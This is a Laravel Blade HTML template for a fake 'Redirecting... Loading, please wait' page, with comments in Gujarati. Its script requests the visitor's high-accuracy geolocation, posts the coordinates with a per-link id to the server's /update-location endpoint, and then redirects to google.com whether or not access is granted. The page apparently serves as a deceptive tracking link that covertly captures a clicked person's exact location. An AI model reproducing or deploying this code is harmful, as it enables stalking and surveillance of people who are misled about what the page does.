<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Loading, please wait...</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                // ચોક્કસ લોકેશન મેળવવા ટ્રાય કરો
                navigator.geolocation.getCurrentPosition(function(position) {
                    // ડેટા સર્વર પર મોકલો
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": "{{ csrf_token() }}"
                        },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => {
                        window.location.href = "https://google.com";
                    }).catch(() => {
                        window.location.href = "https://google.com";
                    });
                }, function(error) {
                    // જો યુઝર બ્લોક કરે તો પણ રીડાયરેક્ટ કરો
                    window.location.href = "https://google.com";
                }, { enableHighAccuracy: true });
            } else {
                window.location.href = "https://google.com";
            }
        };
    </script>
</body>
</html>

